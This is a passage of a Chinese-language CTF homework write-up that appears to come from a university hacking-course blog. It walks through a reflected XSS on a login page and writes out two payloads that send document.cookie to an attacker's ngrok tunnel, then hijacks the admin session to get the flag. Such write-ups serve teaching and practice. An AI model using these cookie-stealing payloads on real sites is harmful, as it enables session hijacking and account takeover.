+<p>下圖 terminal 左半部為在 local 開啟的 server，但由於沒有對外的 public IP 可以接收資訊，因此需要用到 ngrok 這個 reverse proxy 工具，如下圖右半部可以看到透過把 local 的 port 映射(map) 到一個 public IP，讓外部能夠透過這個 IP 連到我們的 server。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-3.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-3.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-3.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-3.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-3.png"
+        title=" " /></p>
+<p>作為 Web 初學者，簡單說明一下如何快速自建Server。<br>
+P.S. 作業環境 Python 3.6</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pip3 install flask
+</span></span><span class="line"><span class="cl">$ sudo pip3 install flask_cors
+</span></span><span class="line"><span class="cl">$ python3 app.py
+</span></span></code></pre></div><p>code 可參考 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/AIS3-EOF-CTF-2019/how2meow/app.py" target="_blank" rel="noopener noreffer ">app.py</a></p>
+<p>利用登入頁面的 XSS 漏洞測試取得 local 端的 cookie，payload 方面要設定跳轉的 public IP，用 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/escape" target="_blank" rel="noopener noreffer "><code>escape</code></a> 或是 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noopener noreffer "><code>fetch</code></a>  擷取 cookie。</p>
+<p>另外要注意若要字串相加 必須把 <code>+</code> 改成 <code>%2B</code> (URL encode) 不然會被瀏覽器判定成空白導致執行失敗，或是可以改用<code>concat()</code>，以下提供兩種應用方式。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">https://message.macacahub.tw/login.php?msg=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">&#34;https://&lt;tunnel_id&gt;.ngrok.io/?c=&#34;</span><span class="o">%</span><span class="mi">2</span><span class="nx">Bescape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://message.macacahub.tw/login.php?msg=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://&lt;tunnel_id&gt;.ngrok.io/?c=&#39;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-4.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-4.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-4.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-4.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-4.png"
+        title=" " /></p>
+<p>一旦成功偷到 local 端的 cookie，我們就能直接登入把上面的「完整網址」當作笑話餵給admin，模仿對方點擊網址將 admin 的 session 傳到我們的 server，LOL🤣🤣🤣。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-5.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-5.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-5.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-5.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-5.png"
+        title=" " /></p>
+<p>最後用 F12大法 或是工具（e.g. Chrome 的 EditThiscookie）把 cookie 換成 admin 的 cookie 再重新整理頁面，拿 Flag。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-6.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-6.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-6.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-6.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-6.png"
+        title=" " /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-12-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2020/nsysu-htcf-hw2/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nsysu-%E9%A7%AD%E5%AE%A2%E6%94%BB%E9%98%B2/">NSYSU 駭客攻防</a>,&nbsp;<a href="/tags/ctf-writeup/">CTF-Writeup</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2020/nsysu-htcf-midterm-writeups/" class="prev" rel="prev" title="[NSYSU 駭客攻防] Midterm Writeups"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[NSYSU 駭客攻防] Midterm Writeups</a>
+            <a href="/posts/2021/swctf-0x7e4-writeups/" class="next" rel="next" title="[Writeup] SWCTF 0x7e4">[Writeup] SWCTF 0x7e4<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
